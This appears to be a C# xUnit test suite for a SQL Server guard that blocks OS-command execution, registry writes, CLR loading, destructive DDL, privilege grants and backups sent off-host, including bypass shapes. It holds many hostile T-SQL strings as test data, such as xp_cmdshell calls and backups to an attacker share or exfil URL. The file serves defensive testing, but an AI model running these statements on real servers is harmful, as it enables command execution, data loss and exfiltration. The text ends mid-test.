/* In the name of God, the Merciful, the Compassionate */

using SQLTriage.Data;
using Xunit;

namespace SQLTriage.Tests
{
    /// <summary>
    /// Unit tests for the narrow per-statement <see cref="DangerousExecGuard"/> that gates the
    /// operator-authored free-form SQL surfaces (scheduled SqlQuery tasks + /query). The guard is
    /// SEPARATE code from the B2-calibrated <see cref="SqlSafetyValidator"/> wall.
    ///
    /// <para>Two contracts are pinned here and each is proved by execution: (1) every OS/system-exec
    /// pattern is blocked — including behind a leading sys.* read, which is exactly the batch-waiver
    /// bypass the shared wall structurally cannot close; and (2) every maintenance statement the
    /// operator surfaces exist to run passes untouched. A miss in either direction is a defect: a
    /// blocked maintenance statement guts the feature, a passed exec statement is the hole.</para>
    /// </summary>
    public class DangerousExecGuardTests
    {
        // ── Contract 1: the OS/system-exec class is BLOCKED, per statement ───────────────────────

        [Theory]
        // xp_cmdshell — direct OS command execution.
        [InlineData("EXEC xp_cmdshell 'whoami';")]
        [InlineData("EXEC master..xp_cmdshell 'dir c:\\';")]
        [InlineData("exec Xp_CmdShell 'net user';")]                    // case-insensitive
        // OLE automation — arbitrary COM reach.
        [InlineData("DECLARE @o int; EXEC sp_OACreate 'WScript.Shell', @o OUT;")]
        [InlineData("EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c whoami';")]
        [InlineData("EXEC sp_OAGetProperty @o, 'ExitCode', @rc OUT;")]
        [InlineData("EXEC sp_OASetProperty @o, 'X', 1;")]
        [InlineData("EXEC sp_OADestroy @o;")]
        // Registry STATE-CHANGE — xp_reg* / xp_instance_reg* writes, deletes, enumerates, multistring.
        // (Narrowed 2026-08-31: pure reads xp_regread / xp_instance_regread now PASS — see Contract 2.)
        [InlineData("EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SW','V','REG_SZ','x';")]
        [InlineData("EXEC xp_regdeletevalue 'HKEY_LOCAL_MACHINE','SW','V';")]
        [InlineData("EXEC xp_regdeletekey 'HKEY_LOCAL_MACHINE','SW';")]
        [InlineData("EXEC xp_instance_regwrite N'HKEY_LOCAL_MACHINE', N'SW', N'V', REG_DWORD, 1;")]
        [InlineData("EXEC xp_regenumvalues 'HKEY_LOCAL_MACHINE','SW';")]
        [InlineData("EXEC xp_regenumkeys 'HKEY_LOCAL_MACHINE','SW';")]
        [InlineData("EXEC xp_regaddmultistring 'HKEY_LOCAL_MACHINE','SW','V','x';")]
        [InlineData("EXEC xp_regremovemultistring 'HKEY_LOCAL_MACHINE','SW','V','x';")]
        // Filesystem enumeration — undocumented extended procs that reach the host OS filesystem
        // (added fix round 2, 2026-08-31). Plain form, sys.-prefixed form, and parameterised forms.
        [InlineData("EXEC xp_dirtree 'D:\\backups', 1, 1;")]
        [InlineData("EXEC master.sys.xp_dirtree 'D:\\backups', 1, 1;")]      // behind a sys.* prefix
        [InlineData("EXEC sys.xp_subdirs 'D:\\';")]                          // behind a sys.* prefix
        [InlineData("EXEC xp_subdirs 'C:\\data';")]
        [InlineData("EXEC master.dbo.xp_fileexist N'D:\\backups\\MyDb.bak';")]
        [InlineData("EXEC xp_fileexist 'D:\\backups\\MyDb.bak';")]
        [InlineData("EXEC xp_getfiledetails 'D:\\backups\\MyDb.bak';")]
        [InlineData("EXEC master.sys.xp_getfiledetails N'D:\\x.mdf';")]      // behind a sys.* prefix
        // CLR loading — arbitrary .NET code into the engine.
        [InlineData("CREATE ASSEMBLY MyAsm FROM 'C:\\x.dll' WITH PERMISSION_SET = UNSAFE;")]
        [InlineData("ALTER ASSEMBLY MyAsm FROM 'C:\\x.dll';")]
        [InlineData("EXEC sp_add_trusted_assembly @hash = 0xABCD, @description = N'x';")]
        // sp_configure toggles that ENABLE the OS/CLR-exec classes.
        [InlineData("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")]
        [InlineData("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;")]
        [InlineData("EXEC sp_configure 'clr enabled', 1; RECONFIGURE;")]
        [InlineData("EXEC sp_configure 'clr strict security', 0; RECONFIGURE;")]
        [InlineData("EXEC sp_configure N'xp_cmdshell', 1;")]            // N-prefixed literal
        public void DangerousStatements_AreBlocked(string sql)
        {
            var verdict = DangerousExecGuard.Inspect(sql);
            Assert.False(verdict.IsAllowed, $"expected BLOCK for: {sql}");
            Assert.NotEmpty(verdict.Reason);
        }

        [Theory]
        // THE BYPASS THE RULING CLOSES: a leading sys.* read waives the shared wall's whole batch,
        // but this guard tests each statement, so the trailing exec is still blocked.
        [InlineData("SELECT 1 FROM sys.databases; EXEC xp_cmdshell 'whoami';")]
        [InlineData("SELECT * FROM sys.dm_exec_sessions; EXEC xp_cmdshell 'net user';")]
        [InlineData("SELECT name FROM sys.configurations; EXEC sp_configure 'xp_cmdshell', 1;")]
        // dangerous statement first, then a benign read — order must not matter.
        [InlineData("EXEC xp_cmdshell 'whoami'; SELECT 1 FROM sys.databases;")]
        // dangerous statement between two benign reads.
        [InlineData("SELECT 1; EXEC sp_OACreate 'WScript.Shell', @o OUT; SELECT 2 FROM sys.tables;")]
        // Filesystem enumeration behind a benign leading statement — the batch-waiver shape.
        [InlineData("SELECT 1 FROM sys.databases; EXEC xp_dirtree 'D:\\backups', 1, 1;")]
        [InlineData("SELECT name FROM sys.master_files; EXEC master.sys.xp_fileexist N'D:\\x.bak';")]
        public void DangerousStatement_BehindOrBesideSysRead_IsStillBlocked(string sql)
        {
            Assert.False(DangerousExecGuard.Inspect(sql).IsAllowed,
                $"a per-statement gate must not let a sys.* read shield: {sql}");
        }

        [Fact]
        public void DangerousExec_HiddenInGo_SeparatedBatch_IsBlocked()
        {
            const string sql = "SELECT 1 FROM sys.databases\nGO\nEXEC xp_cmdshell 'whoami'\nGO";
            Assert.False(DangerousExecGuard.Inspect(sql).IsAllowed);
        }

        // ── Contract 2: maintenance DDL/DML PASSES ───────────────────────────────────────────────

        [Theory]
        // Backup / integrity — the operator surfaces exist so a DBA can run these directly.
        [InlineData("BACKUP DATABASE [MyDb] TO DISK = 'D:\\bak\\MyDb.bak';")]
        [InlineData("BACKUP LOG [MyDb] TO DISK = 'D:\\bak\\MyDb.trn';")]
        [InlineData("DBCC CHECKDB('MyDb') WITH NO_INFOMSGS;")]
        // Index / statistics maintenance.
        [InlineData("CREATE INDEX IX_1 ON dbo.T(col);")]
        [InlineData("CREATE NONCLUSTERED INDEX IX_2 ON dbo.T(col) INCLUDE (other);")]
        [InlineData("ALTER INDEX ALL ON dbo.T REBUILD;")]
        [InlineData("DROP INDEX IX_1 ON dbo.T;")]
        [InlineData("UPDATE STATISTICS dbo.T;")]
        [InlineData("EXEC sp_updatestats;")]
        [InlineData("TRUNCATE TABLE dbo.Staging;")]
        // Plain DML.
        [InlineData("UPDATE dbo.T SET col = 1 WHERE id = 2;")]
        [InlineData("INSERT INTO dbo.T (col) VALUES (1);")]
        [InlineData("DELETE FROM dbo.T WHERE id = 3;")]
        [InlineData("SELECT * FROM sys.databases;")]
        [InlineData("MERGE dbo.T AS t USING dbo.S AS s ON t.id = s.id WHEN MATCHED THEN UPDATE SET t.col = s.col;")]
        // Agent job DDL.
        [InlineData("EXEC msdb.dbo.sp_add_job @job_name = N'Nightly';")]
        [InlineData("EXEC msdb.dbo.sp_add_jobstep @job_name = N'Nightly', @step_name = N'S1', @command = N'SELECT 1';")]
        // Ola Hallengren solution invocations (the shipped remediation path).
        [InlineData("EXEC dbo.IndexOptimize @Databases = 'ALL_DATABASES';")]
        [InlineData("EXEC dbo.DatabaseBackup @Databases = 'USER_DATABASES', @Directory = 'D:\\bak', @BackupType = 'FULL';")]
        // sp_configure of a MAINTENANCE option (never a dangerous one) passes, prerequisite included.
        [InlineData("EXEC sp_configure 'max degree of parallelism', 4; RECONFIGURE;")]
        [InlineData("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")]
        [InlineData("EXEC sp_configure 'cost threshold for parallelism', 50; RECONFIGURE;")]
        // A bare RECONFIGURE is used after benign sp_configure calls — never blocked on its own.
        [InlineData("RECONFIGURE;")]
        // A READ that only MENTIONS a dangerous proc name as string data is not an exec — it passes,
        // exactly as the shared wall's own allowed case does.
        [InlineData("SELECT name, value FROM sys.configurations WHERE name = 'xp_cmdshell';")]
        [InlineData("SELECT definition FROM sys.sql_modules WHERE definition LIKE '%xp_cmdshell%';")]
        // Same for the filesystem-enum procs: a read that only MENTIONS the proc name as string
        // data (audit query / definition search) is not an exec — the literal is blanked, so it passes.
        [InlineData("SELECT definition FROM sys.sql_modules WHERE definition LIKE '%xp_dirtree%';")]
        [InlineData("SELECT name FROM sys.objects WHERE name = 'xp_fileexist';")]
        [InlineData("SELECT 'xp_subdirs is a filesystem proc' AS note;")]
        // Registry READS are information retrieval, not OS execution or state-change — allowed after
        // the 2026-08-31 narrowing. A shipped read-only panel (security.failed_logins_1h) EXECs
        // xp_instance_regread to display the host's MSSQLServer AuditLevel; blocking it dropped the
        // panel from the cache for no security gain.
        [InlineData("EXEC xp_regread 'HKEY_LOCAL_MACHINE','SW','V';")]
        [InlineData("DECLARE @al INT; EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE', N'SW', N'V', @al OUTPUT;")]
        // A dangerous token that is only inside a COMMENT is stripped and does not run.
        [InlineData("SELECT 1 FROM sys.databases; -- EXEC xp_cmdshell 'whoami'")]
        [InlineData("SELECT 1 /* EXEC xp_cmdshell 'whoami' */ FROM sys.databases;")]
        public void MaintenanceStatements_Pass(string sql)
        {
            var verdict = DangerousExecGuard.Inspect(sql);
            Assert.True(verdict.IsAllowed,
                $"maintenance must not be blocked: {sql} (reason if blocked: {verdict.Reason})");
        }

        [Theory]
        [InlineData(null)]
        [InlineData("")]
        [InlineData("   ")]
        [InlineData("\n\t ")]
        public void EmptyOrWhitespace_IsAllowed(string? sql)
        {
            Assert.True(DangerousExecGuard.Inspect(sql).IsAllowed);
        }

        // ── Mutation guards: the reason names the class that fired ────────────────────────────────

        [Fact]
        public void Block_Reason_NamesTheOffendingClass()
        {
            Assert.Contains("xp_cmdshell", DangerousExecGuard.Inspect("EXEC xp_cmdshell 'x';").Reason);
            Assert.Contains("OLE Automation", DangerousExecGuard.Inspect("EXEC sp_OACreate 'x', @o OUT;").Reason);
            Assert.Contains("Registry", DangerousExecGuard.Inspect("EXEC xp_regwrite 'H','S','V','REG_SZ','x';").Reason);
            Assert.Contains("Filesystem enumeration", DangerousExecGuard.Inspect("EXEC xp_dirtree 'D:\\x', 1, 1;").Reason);
            Assert.Contains("CLR", DangerousExecGuard.Inspect("CREATE ASSEMBLY a FROM 'x';").Reason);
            Assert.Contains("clr enabled", DangerousExecGuard.Inspect("EXEC sp_configure 'clr enabled', 1;").Reason);
        }

        [Fact]
        public void ConfigToggle_OfMaintenanceOption_DoesNotFalselyMatchDangerousReason()
        {
            // Proves the config-toggle pattern is scoped to the four dangerous options only: a MAXDOP
            // toggle is allowed, so tightening its regex to also catch 'xp_cmdshell' would be caught
            // here by the maintenance theory, and loosening it to any sp_configure would be caught by
            // this allow.
            Assert.True(DangerousExecGuard.Inspect("EXEC sp_configure 'max degree of parallelism', 4;").IsAllowed);
        }

        [Fact]
        public void Registry_ReadAllowed_ButWriteDeleteEnumerate_Blocked()
        {
            // Pins the 2026-08-31 narrowing direction: a revert to the old catch-all `xp_reg[a-z]+`
            // pattern would re-block the reads (failing the first two asserts), and dropping the
            // registry gate entirely would let the writes through (failing the rest).
            Assert.True(DangerousExecGuard.Inspect("EXEC xp_regread 'H','S','V';").IsAllowed);
            Assert.True(DangerousExecGuard.Inspect("EXEC xp_instance_regread N'H', N'S', N'V', @o OUT;").IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("EXEC xp_regwrite 'H','S','V','REG_SZ','x';").IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("EXEC xp_instance_regwrite N'H',N'S',N'V',REG_DWORD,1;").IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("EXEC xp_regdeletekey 'H','S';").IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("EXEC xp_regenumvalues 'H','S';").IsAllowed);
        }

        [Fact]
        public void Filesystem_EnumerationProcs_AreBlocked_ButAStringMention_Passes()
        {
            // Pins the fix-round-2 addition (2026-08-31): the four filesystem-enum extended procs are
            // blocked as identifiers/execs — dropping the pattern would fail the first four asserts —
            // while a read that carries the name only as string DATA still passes, because the guard
            // blanks string literals before matching the exec patterns. All four names are exercised
            // so narrowing the alternation to miss one is caught here.
            Assert.False(DangerousExecGuard.Inspect("EXEC xp_dirtree 'D:\\backups', 1, 1;").IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("EXEC xp_subdirs 'D:\\';").IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("EXEC master.sys.xp_fileexist N'D:\\x.bak';").IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("EXEC xp_getfiledetails 'D:\\x.mdf';").IsAllowed);
            Assert.True(DangerousExecGuard.Inspect(
                "SELECT definition FROM sys.sql_modules WHERE definition LIKE '%xp_dirtree%';").IsAllowed);
            Assert.True(DangerousExecGuard.Inspect("SELECT 'xp_fileexist' AS mentioned_only;").IsAllowed);
        }

        // ── Contract 3 (2026-09-07): the DESTRUCTIVE class is blocked under the UNATTENDED policy ─
        //
        // Proved live 2026-09-06 that this class was missing entirely: a scheduled task carrying
        // `DROP TABLE dbo.FreshEyesGateProbe_DoesNotExist;` REACHED .\new2022 and executed there.
        // Every case below is executed here against the real guard, not asserted from source.

        [Theory]
        // DROP of persistent objects.
        [InlineData("DROP DATABASE [Payroll];", "DROP DATABASE")]
        [InlineData("DROP TABLE dbo.Invoices;", "DROP TABLE")]
        [InlineData("DROP TABLE IF EXISTS dbo.Invoices;", "DROP TABLE")]
        [InlineData("drop table Invoices;", "DROP TABLE")]                       // case-insensitive
        [InlineData("DROP INDEX IX_1 ON dbo.T;", "DROP of a database object")]
        [InlineData("DROP PROCEDURE dbo.usp_Thing;", "DROP of a database object")]
        [InlineData("DROP VIEW dbo.v_Thing;", "DROP of a database object")]
        [InlineData("DROP FUNCTION dbo.fn_Thing;", "DROP of a database object")]
        [InlineData("DROP TRIGGER dbo.tr_Thing;", "DROP of a database object")]
        [InlineData("DROP SCHEMA app;", "DROP of a database object")]
        // DROP of security principals.
        [InlineData("DROP LOGIN [contoso\\svc];", "DROP of a login, user, role or key")]
        [InlineData("DROP USER [app_user];", "DROP of a login, user, role or key")]
        [InlineData("DROP ROLE app_role;", "DROP of a login, user, role or key")]
        // Whole-table data loss.
        [InlineData("TRUNCATE TABLE dbo.Invoices;", "TRUNCATE TABLE")]
        [InlineData("DELETE FROM dbo.Invoices;", "DELETE with no WHERE clause")]
        [InlineData("DELETE dbo.Invoices;", "DELETE with no WHERE clause")]
        // Database / server state and privilege.
        [InlineData("ALTER DATABASE [Payroll] SET RECOVERY SIMPLE;", "ALTER DATABASE")]
        [InlineData("ALTER DATABASE [Payroll] SET SINGLE_USER WITH ROLLBACK IMMEDIATE;", "ALTER DATABASE")]
        [InlineData("ALTER LOGIN [sa] WITH PASSWORD = 'x';", "ALTER of a login, role, credential or server audit")]
        [InlineData("ALTER SERVER ROLE sysadmin ADD MEMBER [contoso\\bob];", "ALTER of a login, role, credential or server audit")]
        [InlineData("ALTER ROLE db_owner ADD MEMBER [app_user];", "ALTER of a login, role, credential or server audit")]
        [InlineData("ALTER SERVER AUDIT [SoxAudit] WITH (STATE = OFF);", "ALTER of a login, role, credential or server audit")]
        [InlineData("GRANT CONTROL SERVER TO [contoso\\bob];", "GRANT/DENY/REVOKE")]
        [InlineData("DENY SELECT ON dbo.T TO [app_user];", "GRANT/DENY/REVOKE")]
        [InlineData("REVOKE SELECT ON dbo.T FROM [app_user];", "GRANT/DENY/REVOKE")]
        [InlineData("EXEC sp_addsrvrolemember 'contoso\\bob', 'sysadmin';", "sp_addsrvrolemember")]
        [InlineData("EXEC sp_addrolemember 'db_owner', 'app_user';", "sp_addrolemember")]
        [InlineData("EXEC sp_droprolemember 'db_owner', 'app_user';", "sp_droprolemember")]
        // Data egress: a full copy of the database written to a network share.
        [InlineData("BACKUP DATABASE [Payroll] TO DISK = N'\\\\attacker\\share\\p.bak';", "BACKUP to a UNC network path")]
        [InlineData("BACKUP LOG [Payroll] TO DISK = '\\\\attacker\\share\\p.trn';", "BACKUP to a UNC network path")]
        // ── Added in fix round 2, 2026-09-07. Every case below is a statement a cold gate MEASURED
        // as allowed on the unattended surface at 9aadb06, with its probe id from that run. ────────
        [InlineData("BACKUP DATABASE [master] TO URL = 'https://exfil.blob.core.windows.net/c/m.bak';", "BACKUP to a URL")]                 // b06
        [InlineData("MERGE dbo.Orders AS t USING (SELECT 1 AS x) s ON 1=0 WHEN NOT MATCHED BY SOURCE THEN DELETE;", "WHEN NOT MATCHED BY SOURCE THEN DELETE")] // b04
        [InlineData("SHUTDOWN WITH NOWAIT;", "SHUTDOWN")]                                                                                 // b07
        [InlineData("SHUTDOWN;", "SHUTDOWN")]                                                                                               // b07
        [InlineData("KILL 55;", "KILL")]                                                                                                    // b08
        [InlineData("KILL @spid;", "KILL")]                                                                                                 // b08
        [InlineData("BULK INSERT dbo.Orders FROM '\\\\nas\\share\\x.csv';", "BULK INSERT")]                                                 // b09
        [InlineData("BULK INSERT dbo.Orders FROM 'D:\\local\\x.csv';", "BULK INSERT")]                                                      // b09, any path
        [InlineData("SELECT * FROM OPENROWSET(BULK 'D:\\x.csv', SINGLE_CLOB) AS f;", "OPENROWSET(BULK")]                                    // b09 sibling
        [InlineData("EXEC sp_rename 'dbo.Orders', 'Orders_old';", "sp_rename")]                                                             // b13
        [InlineData("DISABLE TRIGGER ALL ON DATABASE;", "DISABLE TRIGGER")]                                                                 // b14
        [InlineData("DROP CERTIFICATE zz_eg_cert;", "DROP of a login, user, role or key")]                                                  // b22
        [InlineData("DROP SYMMETRIC KEY k;", "DROP of a login, user, role or key")]                                                         // b22 sibling
        [InlineData("ALTER TABLE dbo.Orders DROP COLUMN Total;", "DROP COLUMN")]                                                            // b20
        // Not measured by the gate; added on the same merits and pinned so the choice is visible.
        [InlineData("RESTORE DATABASE [Payroll] FROM DISK = 'D:\\bak\\p.bak' WITH REPLACE;", "RESTORE DATABASE/LOG")]
        [InlineData("DBCC CHECKDB('MyDb', REPAIR_ALLOW_DATA_LOSS);", "REPAIR_ALLOW_DATA_LOSS")]
        public void DestructiveClass_IsBlocked_UnderTheUnattendedPolicy(string sql, string reasonFragment)
        {
            var verdict = DangerousExecGuard.Inspect(sql, ExecSurfacePolicy.Unattended);

            Assert.False(verdict.IsAllowed, $"an unattended surface must refuse: {sql}");
            Assert.Contains(reasonFragment, verdict.Reason);
            Assert.Contains("is not permitted on an unattended surface", verdict.Reason);
        }

        [Theory]
        // The SAME statements, judged under the DEFAULT policy, still PASS. This is not a gap being
        // excused — it is the scoping being pinned. The default policy is what the attended callers
        // use (the /query console, the dashboard load path, and the remediation render/apply path,
        // whose whole purpose is to render DROP INDEX / ALTER DATABASE / BACKUP under a preview and
        // an operator confirmation). If someone widens the DEFAULT instead of a surface, these fail.
        [InlineData("DROP TABLE dbo.Invoices;")]
        [InlineData("TRUNCATE TABLE dbo.Invoices;")]
        [InlineData("ALTER DATABASE [Payroll] SET RECOVERY SIMPLE;")]
        [InlineData("GRANT CONTROL SERVER TO [contoso\\bob];")]
        [InlineData("EXEC sp_executesql @sql;")]
        [InlineData("DELETE FROM dbo.Invoices;")]
        public void DestructiveClass_IsNotAppliedUnderTheDefaultPolicy(string sql)
        {
            Assert.True(DangerousExecGuard.Inspect(sql).IsAllowed,
                $"the default policy is the attended surfaces' behaviour and must be unchanged: {sql}");
            Assert.True(DangerousExecGuard.Inspect(sql, ExecSurfacePolicy.OsExecOnly).IsAllowed);
        }

        [Fact]
        public void TheOsExecClass_StillApplies_UnderTheUnattendedPolicy()
        {
            // The extra flags ADD classes; they must never displace the original one.
            Assert.False(DangerousExecGuard.Inspect("EXEC xp_cmdshell 'whoami';", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("EXEC sp_configure 'xp_cmdshell', 1;", ExecSurfacePolicy.Unattended).IsAllowed);
        }

        [Theory]
        // ── Contract 4: the maintenance list an unattended task EXISTS to run still passes ────────
        // Every one of these is a real scheduled-maintenance statement. A false positive here does
        // not merely annoy: it silently stops a customer's nightly job.
        [InlineData("UPDATE STATISTICS dbo.T;")]
        [InlineData("UPDATE STATISTICS dbo.T WITH FULLSCAN;")]
        [InlineData("EXEC sp_updatestats;")]
        [InlineData("ALTER INDEX ALL ON dbo.T REBUILD;")]
        [InlineData("ALTER INDEX IX_1 ON dbo.T REORGANIZE;")]
        [InlineData("ALTER TABLE dbo.T DROP CONSTRAINT CK_1;")]           // removes a RULE, not data
        [InlineData("CREATE INDEX IX_1 ON dbo.T(col) WITH (DROP_EXISTING = ON);")]
        [InlineData("DBCC CHECKDB('MyDb') WITH NO_INFOMSGS;")]
        [InlineData("DBCC SHRINKFILE (MyDb_log, 1024);")]
        [InlineData("EXEC sp_Blitz @CheckUserDatabaseObjects = 1;")]
        [InlineData("EXEC dbo.IndexOptimize @Databases = 'USER_DATABASES';")]
        [InlineData("SELECT name FROM sys.tables ORDER BY name;")]
        [InlineData("SELECT * FROM sys.databases;")]
        [InlineData("BACKUP DATABASE [MyDb] TO DISK = 'D:\\bak\\MyDb.bak';")]     // LOCAL path: fine
        [InlineData("BACKUP LOG [MyDb] TO DISK = N'D:\\bak\\MyDb.trn' WITH INIT;")]
        [InlineData("DELETE FROM dbo.T WHERE id = 3;")]                            // qualified
        [InlineData("DELETE TOP (1000) FROM dbo.T WHERE Created < DATEADD(day,-90,GETDATE());")]
        [InlineData("DROP TABLE #staging;")]                                        // scratch
        [InlineData("DROP TABLE IF EXISTS #staging;")]
        [InlineData("DROP TABLE ##global_scratch;")]
        // Probes m11 / m12 (fix round 2): a scratch table whose name is BRACKET-QUOTED. The temp-table
        // lookahead used to inspect the character after the whitespace, which is '[' for a quoted
        // identifier, so a maintenance script that brackets its scratch names was refused.
        [InlineData("DROP TABLE [#staging];")]
        [InlineData("DROP TABLE IF EXISTS [#staging];")]
        [InlineData("TRUNCATE TABLE [#staging];")]
        [InlineData("DELETE FROM [#staging];")]
        [InlineData("TRUNCATE TABLE #staging;")]
        [InlineData("DELETE FROM #staging;")]
        [InlineData("DELETE FROM @rows;")]
        [InlineData("UPDATE dbo.T SET col = 1;")]      // unqualified UPDATE is deliberately NOT in the class
        [InlineData("INSERT INTO dbo.T (col) VALUES (1);")]
        [InlineData("EXEC msdb.dbo.sp_delete_backuphistory @oldest_date = '2020-01-01';")]
        public void MaintenanceStatements_StillPass_UnderTheUnattendedPolicy(string sql)
        {
            var verdict = DangerousExecGuard.Inspect(sql, ExecSurfacePolicy.Unattended);
            Assert.True(verdict.IsAllowed,
                $"an unattended maintenance task must still run: {sql} — blocked as: {verdict.Reason}");
        }

        [Fact]
        public void ADestructiveWordThatIsOnlyTextDoesNotTripTheUnattendedPolicy()
        {
            // Inside a string literal — the guard blanks literal CONTENTS before matching.
            Assert.True(DangerousExecGuard.Inspect(
                "SELECT definition FROM sys.sql_modules WHERE definition LIKE '%DROP TABLE%';",
                ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect(
                "SELECT 'TRUNCATE TABLE dbo.T' AS suggested_fix;", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect(
                "SELECT 'GRANT CONTROL SERVER TO x' AS remediation;", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect(
                "SELECT name, 'ALTER DATABASE ' + QUOTENAME(name) + ' SET RECOVERY FULL' AS fix FROM sys.databases;",
                ExecSurfacePolicy.Unattended).IsAllowed);

            // Inside a comment — the splitter removes comments before any pattern sees the text.
            Assert.True(DangerousExecGuard.Inspect(
                "-- DROP TABLE dbo.Invoices;\nSELECT 1;", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect(
                "/* TRUNCATE TABLE dbo.T; GRANT CONTROL SERVER TO bob; */ SELECT 1;",
                ExecSurfacePolicy.Unattended).IsAllowed);

            // A column whose VALUE is the word GRANT. This passes because string-literal CONTENTS are
            // blanked before matching, NOT because the rule is anchored — the anchoring was removed in
            // fix round 2 and this case is why the replacement is a lookbehind rather than nothing.
            Assert.True(DangerousExecGuard.Inspect(
                "SELECT permission_name, state_desc FROM sys.database_permissions WHERE state_desc = 'GRANT';",
                ExecSurfacePolicy.Unattended).IsAllowed);

            // The same words as BRACKET-QUOTED or DOUBLE-QUOTED identifiers, which is the other way a
            // reserved word can legitimately appear outside a literal. The lookbehind rules these out.
            Assert.True(DangerousExecGuard.Inspect(
                "SELECT [Grant], [Deny] FROM dbo.PermissionMatrix;", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect(
                "SELECT p.[Revoke] FROM dbo.PermissionMatrix p;", ExecSurfacePolicy.Unattended).IsAllowed);
        }

        // ── Contract 5: SHIELDING IMMUNITY, exercised on the forms that actually shield ──────────
        // THE POINT OF THIS TEST. A cold gate proved on 2026-09-07 that the round-1 class was NOT
        // shielding-immune: `SELECT 1\nDELETE FROM dbo.Orders` passed the guard, reached .\new2022
        // through a real scheduled task and emptied the table, because the DELETE and GRANT rules were
        // anchored at '^[\s;]*' while the splitter only splits on ';' and standalone GO — and T-SQL
        // does not require a semicolon. The test that carried this name at the time exercised ONLY the
        // separator forms (';' and GO) that happen to work, so the suite stayed green while the
        // documented invariant was broken. Every case below is SEPARATOR-FREE on purpose.
        [Theory]
        // b01 / the live probe: the exact statement that emptied dbo.zz_eg_Orders on .\new2022.
        [InlineData("SELECT 1\nDELETE FROM dbo.zz_eg_Orders")]
        // b10: a realistic lead rather than a bare SELECT 1.
        [InlineData("DECLARE @x INT\nDELETE FROM dbo.Invoices")]
        // b02 / b24: the permission class behind the same shield.
        [InlineData("SELECT 1\nGRANT CONTROL SERVER TO [zz_eg_evil]")]
        [InlineData("SELECT 1\nDENY SELECT ON dbo.zz_eg_Orders TO public")]
        [InlineData("SELECT 1\nREVOKE SELECT ON dbo.T FROM [app_user]")]
        // The rest of the destructive class behind the same shield, so the property is pinned for the
        // whole class and not just for the two rules that were broken.
        [InlineData("SELECT 1\nDROP TABLE dbo.Invoices")]
        [InlineData("SELECT 1\nTRUNCATE TABLE dbo.Invoices")]
        [InlineData("SELECT 1\nALTER DATABASE [Payroll] SET RECOVERY SIMPLE")]
        [InlineData("SELECT 1\nALTER TABLE dbo.T DROP COLUMN c")]
        [InlineData("SELECT 1\nSHUTDOWN WITH NOWAIT")]
        [InlineData("SELECT 1\nRESTORE DATABASE [P] FROM DISK = 'D:\\p.bak'")]
        [InlineData("SELECT 1\nEXEC sp_MSforeachtable 'DELETE FROM ?'")]
        [InlineData("SELECT 1\nEXEC sp_executesql @sql")]
        // A shield that itself carries a WHERE: the round-1 no-WHERE test looked for the token
        // anywhere in the chunk, so a neighbour's WHERE was enough to hide an unqualified DELETE.
        [InlineData("SELECT * FROM sys.databases WHERE database_id > 4\nDELETE FROM dbo.Invoices")]
        // …and the same shield placed AFTER the DELETE, which the extent bound also has to survive.
        [InlineData("DELETE FROM dbo.Invoices\nSELECT * FROM sys.databases WHERE database_id > 4")]
        public void ShieldingImmunity_ALeadingStatementWithNoSemicolonCannotShieldATrailingOne(string sql)
        {
            var verdict = DangerousExecGuard.Inspect(sql, ExecSurfacePolicy.Unattended);
            Assert.False(verdict.IsAllowed,
                $"a leading statement must not shield a trailing dangerous one: {sql}");
        }

        [Fact]
        public void PerStatement_ALeadingReadCannotShieldATrailingDestructiveStatement()
        {
            // The separator forms. These worked in round 1 too; they are kept as the CONTROL that
            // proves the round-1 failure was the anchoring and not the splitter.
            Assert.False(DangerousExecGuard.Inspect(
                "SELECT 1 FROM sys.databases; DROP TABLE dbo.Invoices;", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.False(DangerousExecGuard.Inspect(
                "SELECT 1 FROM sys.databases\nGO\nTRUNCATE TABLE dbo.Invoices\nGO", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.False(DangerousExecGuard.Inspect(
                "SELECT 1; -- harmless\nGRANT CONTROL SERVER TO [contoso\\bob];", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.False(DangerousExecGuard.Inspect(
                "SELECT 1; DELETE FROM dbo.Invoices;", ExecSurfacePolicy.Unattended).IsAllowed);
        }

        [Fact]
        public void DynamicallyBuiltSql_IsRefusedAsAClass_NotDecoded()
        {
            // THE HONEST LIMIT, pinned so nobody later mistakes it for a claim of decoding:
            // `EXEC('DR' + 'OP TABLE x')` carries NO "DROP TABLE" token — after literal blanking it
            // is `EXEC('' + '')`. No static matcher can see the statement it will build. The guard
            // therefore refuses the CONSTRUCTION, which is the only answer it can make honestly.
            var concat = DangerousExecGuard.Inspect("EXEC('DR' + 'OP TABLE dbo.Invoices');", ExecSurfacePolicy.Unattended);
            Assert.False(concat.IsAllowed);
            Assert.Contains("SQL built at run time", concat.Reason);
            Assert.DoesNotContain("DROP TABLE", concat.Reason);   // it was never decoded, and does not pretend to be

            Assert.False(DangerousExecGuard.Inspect("EXEC sp_executesql N'DROP TABLE dbo.T';", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("EXEC sys.sp_executesql @sql;", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("DECLARE @s NVARCHAR(200)='x'; EXEC(@s);", ExecSurfacePolicy.Unattended).IsAllowed);
